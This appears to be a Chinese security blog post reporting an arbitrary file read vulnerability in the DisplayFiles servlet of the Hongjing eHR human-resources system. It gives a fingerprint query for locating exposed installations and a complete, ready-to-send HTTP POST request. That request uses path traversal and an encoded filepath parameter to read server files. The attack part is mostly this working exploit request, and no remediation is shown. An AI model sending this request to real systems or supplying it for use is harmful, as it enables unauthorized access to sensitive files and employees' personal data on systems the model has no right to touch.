#  宏景eHRDisplayFiles存在任意文件读取漏洞   
原创 骇客安全  骇客安全   2025-02-07 06:53  
  
# 一、漏洞简介  
  
宏景人力资源信息管理系统是一款全面覆盖人力资源管理各模块的软件，旨在帮助企事业单位构建高绩效组织，推动组织健康成长，提升组织软实力。系统功能包括人员、组织机构、档案、合同、薪资、保险、绩效、考勤、招聘、培训、干部任免和人事流程等业务的管理，以及人事、绩效、培训、招聘、考勤等业务自助，还具备报表功能和灵活的表格工具，支持集团管控、目标管理、领导决策等应用。宏景人力资源信息管理系统DisplayFiles存在任意文件读取漏洞，攻击者可通过该漏洞获取敏感信息。  
# 二、影响版本  
- 宏景人力资源信息管理系统  
# 三、资产测绘  
- hunterapp.name="宏景 HCM"  
- 特征  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991NAia0oKns6EIblBMXdwLRaL0lKJYVR0C7gvrG7QnZQT7Wzmak4dKia5X96ib8QHTgalAqLVbQNT9nzQ/640?wx_fmt=png&from=appmsg "null")  
# 四、漏洞复现  
```
POST /templates/attestation/../../servlet/DisplayFiles HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-type: application/x-www-form-urlencoded
Content-Length: 86
Connection: close

filepath=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991NAia0oKns6EIblBMXdwLRaLwsjtHfdziaRZkibuNqGf4VXWxd8ygUHjQGmjauYVNc9iaCoNxILYgfX7A/640?wx_fmt=png&from=appmsg "null")  
  
  
